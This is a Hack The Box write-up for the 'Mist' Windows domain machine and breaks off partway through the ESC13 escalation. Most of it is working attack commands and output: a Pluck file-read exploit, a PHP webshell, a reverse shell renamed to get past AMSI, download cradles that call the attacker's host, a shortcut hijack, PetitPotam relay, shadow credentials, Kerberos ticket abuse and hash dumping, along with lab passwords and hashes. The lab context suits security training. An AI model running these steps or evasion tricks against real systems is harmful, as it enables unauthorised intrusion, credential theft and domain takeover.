---
icon: campfire
cover: ../../../../.gitbook/assets/Screenshot 2026-03-13 102015.png
coverY: 0.6763667011126476
---

# HTB-MIST

### Reconnaissance <a href="#reconnaissance" id="reconnaissance"></a>

Only one port open. Yeah, just one. Already tells you this whole thing routes through a web app.

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Mist]
└─$ rustscan -a 10.10.11.17 blah blah 
```

```
Open 10.10.11.17:80

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
|_http-generator: pluck 4.7.18
| http-cookie-flags:
|   /: 
|     PHPSESSID:
|_      httponly flag not set
| http-robots.txt: 2 disallowed entries
|_/data/ /docs/
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
| http-title: Mist - Mist
|_Requested resource was http://10.10.11.17/?file=mist
```

Apache on Windows with PHP 8.1 running a CMS called **Pluck 4.7.18**. The `http-generator` header just tells you straight up what CMS this is. robots.txt is disallowing `/data/` and `/docs/` which is actually useful those paths exist and are probably listable. The `?file=mist` redirect hints at a local file inclusion style parameter too. Worth noting.

***

### Enumeration

#### Website

Browsing to port 80 shows a blog-style site for "Mist". There's a link to `/login.php` which is the Pluck admin panel. Before we brute or guess the password, let's look for something better — because with any CMS the first question is always: does this version have a known vuln?

A quick search for **CVE-2024-9405** turns up a file read vulnerability in Pluck 4.7.18. The endpoint `/data/modules/albums/albums_getimage.php?image=[filename]` returns raw file contents without any auth check. That's our foot in the door.

The directories under `/data/` are listable. Browsing to `/data/settings/modules/albums/` shows a couple of PHP files:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Mist]
└─$ curl "http://10.10.11.17/data/modules/albums/albums_getimage.php?image=mist.php"
```

```php
<?php
$album_name = 'Mist';
?>
```

Nothing exciting. But this next one:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Mist]
└─$ curl "http://10.10.11.17/data/modules/albums/albums_getimage.php?image=admin_backup.php"
```

```php
<?php
$ww = 'c81dde783f9543114ecd9fa14e8440a2a868bfe0bacdf14d29fce0605c09d5a2bcd2028d0d7a3fa805573d074faa15d6361f44aec9a6efe18b754b3c265ce81e';
?>
```

`$ww` is the variable Pluck uses internally to store the admin password hash. That's a SHA-512 (no salt, typical for old PHP CMSes). Throw it at CrackStation:

```
c81dde783f9543114ecd9fa14e8440a2a868bfe0bacdf14d29fce0605c09d5a2bcd2028d0d7a3fa805573d074faa15d6361f44aec9a6efe18b754b3c265ce81e
→ SHA-512 → passwordhere
```

CrackStation cracks it instantly. Password logs in at `/login.php` no problem.

The file read vuln mattered here specifically because there was a `admin_backup.php` sitting in a listable directory. If you didn't enumerate those paths from robots.txt you'd miss it completely.

***

### Exploitation — Initial Foothold (svc\_web on MS01)

#### Pluck Webshell via Module Upload

Pluck has a "Manage Modules" option in the admin panel. You can install custom modules as zip files. There's zero validation on what's inside the zip. So we just pack a PHP webshell and upload it.

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Mist]
└─$ mkdir sn0x_mod && echo '<?php system($_REQUEST["cmd"]); ?>' > sn0x_mod/shell.php
┌──(sn0x㉿sn0x)-[~/HTB/Mist]
└─$ zip -r notevil.zip sn0x_mod/
```

Go to admin panel → Options → Manage Modules → Install a module → upload `notevil.zip`. The module installs to `/data/modules/notevil/`. Webshell lands at:

```
http://10.10.11.17/data/modules/notevil/sn0x_mod/shell.php?cmd=whoami
```

RCE confirmed as `sharp\svc_web` on a machine called `ms01`. But wait — time to get a proper shell. The obvious move is a PowerShell reverse shell from revshells.com. That gets blocked. Nothing comes back.

#### AMSI Bypass

Windows Defender is running and AMSI is blocking anything recognizable as a PowerShell reverse shell. The thing is, AMSI is signature-based — it matches strings. So if you rename every variable in the standard PS reverse shell, the signature breaks.

Original revshell.com "PowerShell #2":

```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.14',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

Renamed version that bypasses AMSI signatures:

```powershell
$c = New-Object Net.Sockets.TCPClient('10.10.14.14',443);$s = $c.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $d 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$ssb = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($ssb,0,$ssb.Length);$s.Flush()};$c.Close()
```

Save as `rev.ps1`, serve it on HTTP, and use a download cradle through the webshell:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Mist]
└─$ python3 -m http.server 80
```

POST via Burp to the webshell with:

```
cmd=IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.14/rev.ps1')
```

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Mist]
└─$ rlwrap -cAr nc -lvnp 443
```

```
Listening on 0.0.0.0 443
Connection received on 10.10.11.17 58397

PS C:\xampp\htdocs\data\modules\notevil\sn0x_mod> whoami
mist\svc_web
```

Shell as `svc_web`. Now let's look around.

> **Note on AV exclusions:** Defender has explicitly excluded `C:\xampp\htdocs\` from scanning. Confirmed via Event ID 5007 logs. Everything we run needs to live in this directory otherwise Defender deletes it immediately. The `files` subdirectory under htdocs is a safe staging area that doesn't get cleaned by cron.

***

### Lateral Movement — svc\_web → brandon.keywarp

#### Enumeration as svc\_web

```powershell
PS C:\> ipconfig
IPv4 Address: 192.168.100.101
Default Gateway: 192.168.100.100

PS C:\> hostname
MS01
```

We're on a VM, not the main host. Gateway `.100` is probably the DC. Looking at `C:\`:

```powershell
PS C:\> ls
```

```
d-----   Common Applications
d-----   PerfLogs
d-r---   Program Files
d-----   Users
d-----   Windows
d-----   xampp
```

Non-standard directory: `Common Applications`. Let's look inside:

```powershell
PS C:\Common Applications> ls
```

```
-a----   Calculator.lnk
-a----   Notepad.lnk
-a----   Wordpad.lnk
```

Shortcut files. And this folder is:

1. Shared over SMB as `Common Applications`
2. Writable by our current user

That's a `.lnk` hijack waiting to happen. Someone is probably clicking these shortcuts. If we overwrite one to run our reverse shell instead, we'll catch whatever account is clicking it.

#### Malicious .lnk Hijack

```powershell
PS C:\Common Applications> $WScriptShell = New-Object -ComObject WScript.Shell
PS C:\Common Applications> $Shortcut = $WScriptShell.CreateShortcut("C:\Common Applications\Notepad.lnk")
PS C:\Common Applications> $Shortcut.TargetPath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
PS C:\Common Applications> $Shortcut.Arguments = "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.14/rev.ps1')"
PS C:\Common Applications> $Shortcut.Save()
```

Wait a couple minutes. A request hits our server:

```
10.10.11.17 - - [13/Mar/2025 09:24:56] "GET /rev.ps1 HTTP/1.1" 200 -
```

And a shell:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Mist]
└─$ rlwrap -cAr nc -lnvp 443
```

```
Connection received on 10.10.11.17 50177

PS C:\Windows\system32> whoami
mist\brandon.keywarp
```

Now we're a domain user. Way more useful.

***

### Domain Enumeration — SharpHound + BloodHound

With a domain account it's time to get the full picture.

```powershell
PS C:\xampp\htdocs\files> .\sharphound.exe -c All
```

```
[*] Resolved current domain to mist.htb
[*] Status: 360 objects finished (+360 120)/s
[*] Enumeration finished in 00:00:03.1402960
```

Exfil the zip back to our host and load into BloodHound-CE. Mark `brandon.keywarp` as owned.

Checking outbound object control for brandon — all domain users can enroll in several certificate templates via `mist-DC01-CA`. That's our next move.

***

### Getting Brandon's NTLM Hash via ADCS

To really move around the domain efficiently, it's way easier to have an NTLM hash than just a shell. Here's how to pull it using the ADCS setup:

**Step 1: Get a cert as brandon using Certify.exe**

```powershell
PS C:\xampp\htdocs\files> .\Certify.exe request /ca:DC01\mist-DC01-CA /template:User
```

```
[*] Current user context    : MIST\Brandon.Keywarp
[*] Template                : User
[*] CA Response             : The certificate had been issued.
[*] Request ID              : 61

[*] cert.pem:
-----BEGIN RSA PRIVATE KEY-----
[...snip...]
-----END CERTIFICATE-----

[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

Copy the PEM blob to your machine, convert it:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Mist]
└─$ openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
# blank password both times
```

Upload `cert.pfx` back to the box and use Rubeus to dump the hash:

**Step 2: Rubeus PKINIT → NTLM**

```powershell
PS C:\xampp\htdocs\files> .\rubeus.exe asktgt /user:brandon.keywarp /certificate:C:\xampp\htdocs\files\cert.pfx /getcredentials /show /nowrap
```

```

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.3 

[*] Action: Ask TGT

[*] Got domain: mist.htb
[*] Using PKINIT with etype rc4_hmac and subject: CN=Brandon.Keywarp, CN=Users, DC=mist, DC=htb 
[*] Building AS-REQ (w/ PKINIT preauth) for: 'mist.htb\brandon.keywarp'
[*] Using domain controller: 192.168.100.100:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      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

  ServiceName              :  krbtgt/mist.htb
  ServiceRealm             :  MIST.HTB
  UserName                 :  brandon.keywarp (NT_PRINCIPAL)
  UserRealm                :  MIST.HTB
  StartTime                :  4/1/2026 12:28:06 AM
  EndTime                  :  4/1/2026 10:28:06 AM
  RenewTill                :  4/8/2026 12:28:06 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  L6Ldo56D+6L1PdFea1Qagw==
  ASREP (key)              :  8C20CF9D44763D097DD55D5308ADEC23

[*] Getting credentials using U2U

  CredentialInfo         :
    Version              : 0
    EncryptionType       : rc4_hmac
    CredentialData       :
      CredentialCount    : 1
       NTLM              : DB03D6A77A2205BC1D07082740626CC9

```

Now we have `brandon.keywarp:DB03D6A77A2205BC1D07082740626CC9`.

***

### Setting Up Tunneling

Everything except port 80 is firewalled from the outside. To use tools like netexec/ldap from our host we need a SOCKS tunnel. Chisel does this cleanly:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Mist]
└─$ ./chisel server -p 8000 --reverse
```

```powershell
PS C:\xampp\htdocs\files> .\chisel.exe client 10.10.14.14:8000 R:socks
```

```
2025/03/13 09:20:57 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
```

Now everything goes through `proxychains`. Let's enumerate:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Mist]
└─$ sudo proxychains -q netexec smb 192.168.100.100 -u brandon.keywarp -H DB03D6A77A2205BC1D07082740626CC9 --shares
```

```
SMB  192.168.100.100  445  DC01  [+] mist.htb\brandon.keywarp:DB03D6A77A2205BC1D07082740626CC9
Share       Permissions     Remark
-----       -----------     ------
ADMIN$                      Remote Admin
C$                          Default share
IPC$        READ            Remote IPC
NETLOGON    READ            Logon server share
SYSVOL      READ            Logon server share
```

No interesting share access. Check machine account quota because we might want to create a fake computer later for RBCD:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Mist]
└─$ sudo proxychains -q netexec ldap 192.168.100.100 -u brandon.keywarp -H DB03D6A77A2205BC1D07082740626CC9 -M maq
```

```
MAQ  192.168.100.100  389  DC01  MachineAccountQuota: 0
```

Zero. We can't add computers. RBCD via fake machine is out. That's fine, we have another way.

Also check LDAP signing — this matters a lot for relay attacks:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Mist]
└─$ sudo proxychains -q netexec ldap 192.168.100.100 -u brandon.keywarp -H DB03D6A77A2205BC1D07082740626CC9 -M ldap-checker
```

```
LDAP-CHE...  192.168.100.100  389  DC01  LDAP Signing NOT Enforced!
```

LDAP signing not enforced. This means we can relay NTLM auth to LDAP/LDAPS. That's the key for the next step.

***

### Privilege Escalation — Part 1: MS01 Administrator via PetitPotam → Shadow Creds

#### The Plan

Here's the chain of abuse:

1. Start WebClient service on MS01 (needed for PetitPotam via WebDAV)
2. Use PetitPotam to coerce MS01 to authenticate to us via WebDAV
3. Relay that auth to DC01 LDAPS with ntlmrelayx, getting an LDAP shell as MS01$
4. Use the LDAP shell to add a shadow credential to MS01$
5. Use the shadow credential to get MS01$'s NTLM hash
6. Use the hash + S4U2self to impersonate Administrator on MS01

This works because:

* LDAP signing is not enforced → we can relay to LDAPS
* MachineAccountQuota is 0 → but we don't need to add a machine, just shadow cred the existing one
* MS01$ has local admin on MS01 → so impersonating Administrator via S4U works

#### Enable WebClient

WebClient isn't running by default and we can't start it normally as svc\_web. Use EtwStartWebClient.cs compiled with mono:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Mist]
└─$ mcs EtwStartWebClient.cs /unsafe
```

Upload and run from the brandon.keywarp shell (or svc\_web):

```powershell
PS C:\xampp\htdocs\files> .\EtwStartWebClient.exe
[+] WebClient Service started successfully
```

Note: a cleanup job resets this quickly. You need to run this right before PetitPotam fires.

#### Port Forward for WebDAV Callback

The problem: PetitPotam needs a DNS name to send auth to. We can't add DNS records to the domain (non-default lockdown). The only targets we can route to are MS01 and DC01. Solution: set up a port forward on MS01 pointing back to our port 80.

```powershell
PS C:\xampp\htdocs\files> .\chisel.exe client 10.10.14.14:8000 22301:127.0.0.1:80
```

Now `MS01:22301` → our port 80. When PetitPotam coerces MS01 to connect to `MS01@22301/whatever`, it routes back through the tunnel to us.

```
[Our Machine:80] ←tunnel← [MS01:22301] ←WebDAV auth← [MS01 (PetitPotam triggered)]
         ↓
    ntlmrelayx
         ↓
    DC01 LDAPS
```

#### Start ntlmrelayx

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Mist]
└─$ sudo proxychains -q ntlmrelayx.py -debug -t ldaps://192.168.100.100 -i -smb2support -domain mist.htb
```

```
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Servers started, waiting for connections
```

#### Fire PetitPotam

Make sure WebClient is running first, then:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Mist]
└─$ sudo proxychains python /opt/PetitPotam/PetitPotam.py \
  -u brandon.keywarp \
  -hashes :DB03D6A77A2205BC1D07082740626CC9 \
  -d mist.htb \
  'MS01@22301/whatever' \
  192.168.100.101 \
  -pipe all
```

```
[+] Connected!
[+] Successfully bound!
[+] OK! Using unpatched function!
[-] Sending EfsRpcEncryptFileSrv!
```

ntlmrelayx catches it:

```
[*] HTTPD(80): Connection from 127.0.0.1 controlled, attacking target ldaps://192.168.100.100
[*] HTTPD(80): Authenticating against ldaps://192.168.100.100 as MIST/MS01$ SUCCEED
[*] Started interactive Ldap shell via TCP on 127.0.0.1:11000 as MIST/MS01$
```

#### LDAP Shell — Add Shadow Credential to MS01$

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Mist]
└─$ nc 127.0.0.1 11000
```

```
# clear_shadow_creds MS01$
Shadow credentials cleared successfully!

# set_shadow_creds MS01$
Found Target DN: CN=MS01,CN=Computers,DC=mist,DC=htb
Target SID: S-1-5-21-1045809509-3006658589-2426055941-1108

KeyCredential generated with DeviceID: eec2c5be-b695-51d9-bce9-f5c760831e12
Shadow credentials successfully added!
Saved PFX (#PKCS12) certificate & key at path: KJNQDFsA.pfx
Must be used with password: rJptn57fg3n4kIRj7Xnc
```

We need to clear first because there was already a credential set — trying to set\_shadow\_creds without clearing gives an "insufficient rights" error that looks like it failed but actually just means there's already one there.

#### Get MS01$ NTLM Hash

Convert the PFX to no-password format, then use Certipy to auth:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Mist]
└─$ sudo proxychains -q certipy cert -export -pfx KJNQDFsA.pfx -password rJptn57fg3n4kIRj7Xnc -out ms01.pfx

┌──(sn0x㉿sn0x)-[~/HTB/Mist]
└─$ sudo proxychains -q certipy auth -pfx ms01.pfx -domain mist.htb -username 'MS01$' -dc-ip 192.168.100.100 -ns 192.168.100.100
```

```
[*] Got TGT
[*] Saved credential cache to 'ms01.ccache'
[*] Got hash for 'ms01$@mist.htb': aad3b435b51404eeaad3b435b51404ee:d682d620b887a24491038115b6dc56bb
```

This hash rotates every \~24 hours and changes on reboot, so note it down but don't rely on it forever.

#### S4U2self → Impersonate Administrator on MS01

From the brandon.keywarp shell on MS01, use Rubeus to get a TGT for the machine account:

```powershell
PS C:\xampp\htdocs\files> .\rubeus asktgt /nowrap /user:"ms01$" /rc4:d682d620b887a24491038115b6dc56bb
```

```
[+] TGT request successful!
[*] base64(ticket.kirbi): doIFLDCCBSigAwIBBaEDAgEW....[snip]....
```

Then S4U2self to get a CIFS ticket as Administrator:

```powershell
PS C:\xampp\htdocs\files> .\rubeus s4u /self /nowrap /impersonateuser:Administrator /altservice:"cifs/ms01.mist.htb" /ticket:doIFLDCCBS...[full base64]
```

```
[*] Got a TGS for 'Administrator' to 'cifs@MIST.HTB'
[*] base64(ticket.kirbi): doIF2jCCBdagAwIBBaED....[snip]....
```

Convert the ticket on our machine:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Mist]
└─$ base64 -d administrator.kirbi.b64 > administrator.kirbi
┌──(sn0x㉿sn0x)-[~/HTB/Mist]
└─$ ticketConverter.py administrator.kirbi administrator.ccache
[*] converting kirbi to ccache...
[+] done
```

Use it to get a shell via wmiexec:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Mist]
└─$ KRB5CCNAME=administrator.ccache proxychains -q wmiexec.py administrator@ms01.mist.htb -k -no-pass
```

```
[*] SMBv3.0 dialect used
C:\> whoami
mist\administrator
```

MS01 administrator. Let's grab the flag and also dump secrets for a save point:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Mist]
└─$ KRB5CCNAME=administrator.ccache proxychains -q secretsdump.py administrator@ms01.mist.htb -k -no-pass
```

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:711e6a685af1c31c4029c3c7681dd97b:::
svc_web:1000:aad3b435b51404eeaad3b435b51404ee:76a99f03b1d2656e04c39b46e16b48c8:::

[*] _SC_ApacheHTTPServer
svc_web:MostSavagePasswordEver123

[*] Dumping cached domain logon information (domain/username:hash)
MIST.HTB/Brandon.Keywarp:$DCC2$10240#Brandon.Keywarp#5f540c9ee8e4bfb80e3c732ff3e12b28
```

Sweet — svc\_web's cleartext password in LSA secrets. Also confirms the web service account.

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Mist]
└─$ sudo proxychains -q evil-winrm -i localhost -u administrator -H 711e6a685af1c31c4029c3c7681dd97b
```

```
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

WinRM shell as local admin on MS01. First flag:

```powershell
*Evil-WinRM* PS C:\Users\administrator\desktop> type user.txt
f95a1c7f************************
```

***

### Lateral Movement — MS01 Admin → op\_sharon.mullard → DC01

#### KeePass in Sharon.Mullard's Profile

As MS01 administrator, all user folders are accessible. Sharon.Mullard has a KeePass database:

```powershell
*Evil-WinRM* PS C:\Users\Sharon.Mullard\Documents> ls
    sharon.kdbx
```

And a couple images in Pictures. Download everything:

```powershell
*Evil-WinRM* PS C:\Users\Sharon.Mullard\Documents> download sharon.kdbx
*Evil-WinRM* PS C:\Users\Sharon.Mullard\Pictures> download image_20022024.png
```

`cats.png` is just cats. `image_20022024.png` is more interesting — it's a screenshot of CyberChef encoding a password in base64. The input field shows 15 characters, and the visible portion is `UA7cpa[#1!_*ZX`. Last character is obscured.

This is a KeePass master password hint. We know 14 of 15 characters. Crack the last one with hashcat:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Mist]
└─$ keepass2john sharon.kdbx > sharon.hash

┌──(sn0x㉿sn0x)-[~/HTB/Mist]
└─$ hashcat --user sharon.hash -m 13400 -a 3 'UA7cpa[#1!_*ZX?a'
```

```
$keepass$*2*60000*0*ae4c5....:UA7cpa[#1!_*ZX@
```

`-m 13400` is KeePass. Mask `?a` = all printable ASCII. It finds `@` as the last character. Full password: `UA7cpa[#1!_*ZX@`

Open the database:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Mist]
└─$ kpcli --kdb=sharon.kdbx
Provide the master password: UA7cpa[#1!_*ZX@

kpcli:/> show -f "sharon/operative account"
Title: operative account
 Pass: ImTiredOfThisJob:(
```

Password: `ImTiredOfThisJob:(` — titled "operative account". That's a hint. It's not for `sharon.mullard`, it's for an `op_` prefixed account. Checking BloodHound for accounts starting with "Sha" turns up `op_Sharon.Mullard`.

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Mist]
└─$ sudo proxychains -q netexec winrm DC01 -u op_sharon.mullard -p 'ImTiredOfThisJob:('
```

```
WINRM  192.168.100.100  5985  DC01  [+] mist.htb\op_sharon.mullard:ImTiredOfThisJob:( (Pwn3d!)
```

WinRM on DC01. Let's get in:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Mist]
└─$ sudo proxychains -q evil-winrm -i DC01 -u op_sharon.mullard -p 'ImTiredOfThisJob:('
```

```
*Evil-WinRM* PS C:\Users\op_Sharon.Mullard\Documents>
```

Shell on DC01 as op\_Sharon.Mullard.

***

### Privilege Escalation — Part 2: DC01 Full Compromise via ESC13

#### Getting svc\_ca$'s NTLM Hash (GMSA)

In BloodHound, `op_Sharon.Mullard` is in the **Operatives** group, which has `ReadGMSAPassword` over `svc_ca$`. GMSA passwords are automatically managed by the domain and can be read by accounts with that permission.

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Mist]
└─$ sudo proxychains -q netexec ldap DC01 -u op_sharon.mullard -p 'ImTiredOfThisJob:(' --gmsa
```

```
[*] Getting GMSA Passwords
Account: svc_ca$    NTLM: 07bb1cde74ed154fcec836bc1122bdcc
```

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Mist]
└─$ sudo proxychains -q netexec smb DC01 -u 'svc_ca$' -H 07bb1cde74ed154fcec836bc1122bdcc
```

```
[+] mist.htb\svc_ca$:07bb1cde74ed154fcec836bc1122bdcc
```

Valid.

#### Shadow Credential on svc\_cabackup

In BloodHound, `svc_ca$` is a member of the **Certificate Services** group which has `AddKeyCredentialLink` over `svc_cabackup`. That means we can add a shadow credential to `svc_cabackup` using `svc_ca$`. Certipy makes this a one-liner:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Mist]
└─$ sudo proxychains -q certipy shadow auto \
  -username 'svc_ca$@mist.htb' \
  -hashes :07bb1cde74ed154fcec836bc1122bdcc \
  -account svc_cabackup
```

```
[*] Targeting user 'svc_cabackup'
[*] Key Credential generated with DeviceID '8a29ef4d-133a-94e6-7b85-fe44e4bac17e'
[*] Successfully added Key Credential to 'svc_cabackup'
[*] Got TGT
[*] Saved credential cache to 'svc_cabackup.ccache'
[*] NT hash for 'svc_cabackup': c9872f1bc10bdd522c12fc2ac9041b64
[*] Successfully restored the old Key Credentials for 'svc_cabackup'
```

`svc_cabackup:c9872f1bc10bdd522c12fc2ac9041b64`

#### ESC13 — ADCS OID Group Link Abuse

This is the final escalation path. Let me explain what ESC13 actually is because it's not as well known as ESC1/ESC4/ESC8.

**ESC13 Background:** A certificate template can have an _issuance policy_ attached to it. That issuance policy can have an `msDS-OIDToGroupLink` attribute linking it to an AD group. When a user authenticates using a certificate issued from that template, they temporarily get a token that includes membership in the linked group — even if they're not in that group in AD. This was documented by SpecterOps in February 2024.

Requirements for ESC13:

* You have enrollment rights on the template
* Template has an issuance policy with a group link
* No extra approval or issuance requirements you can't meet
* Template has client auth EKU

Check for it with the PowerShell script or the Certipy fork:

```powershell
*Evil-WinRM* PS C:\programdata> . .\Check-ADCSESC13.ps1
```

```
OID links to group: CN=Certificate Managers,CN=Users,DC=mist,DC=htb
Certificate template ManagerAuthentication may be used to obtain membership of CN=Certificate Managers,CN=Users,DC=mist,DC=htb

OID links to group: CN=ServiceAccounts,OU=Services,DC=mist,DC=htb
Certificate template BackupSvcAuthentication may be used to obtain membership of CN=ServiceAccounts,OU=Services,DC=mist,DC=htb
```

Two vulnerable templates:

* `ManagerAuthentication` → membership in **Certificate Managers**
* `BackupSvcAuthentication` → membership in **ServiceAccounts**

And here's the chain BloodHound shows us:

* Certificate Managers → member of → **CA Backup** group
* ServiceAccounts → member of → **Backup Operators**

Backup Operators can read the SAM/SYSTEM/SECURITY registry hives and dump domain hashes. That's our path to Administrator.

#### Exploit Chain

**Step 1: Cert via ManagerAuthentication → gain Certificate Managers membership**

Note: this template requires a 4096-bit key:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Mist]
└─$ sudo proxychains -q certipy req \
  -u svc_cabackup \
  -hashes :c9872f1bc10bdd522c12fc2ac9041b64 \
  -ca mist-DC01-CA \
  -template ManagerAuthentication \
  -dc-ip 192.168.100.100 \
  -key-size 4096
```

```
[*] Successfully requested certificate
[*] Saved certificate and private key to 'svc_cabackup.pfx'
```

**Step 2: Get TGT with that cert (now includes Certificate Managers group in token)**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Mist]
└─$ sudo proxychains -q certipy auth -pfx ./svc_cabackup.pfx -kirbi -dc-ip 192.168.100.100

┌──(sn0x㉿sn0x)-[~/HTB/Mist]
└─$ ticketConverter.py svc_cabackup.kirbi svc_cabackup.ccache
[*] converting kirbi to ccache...
[+] done
```

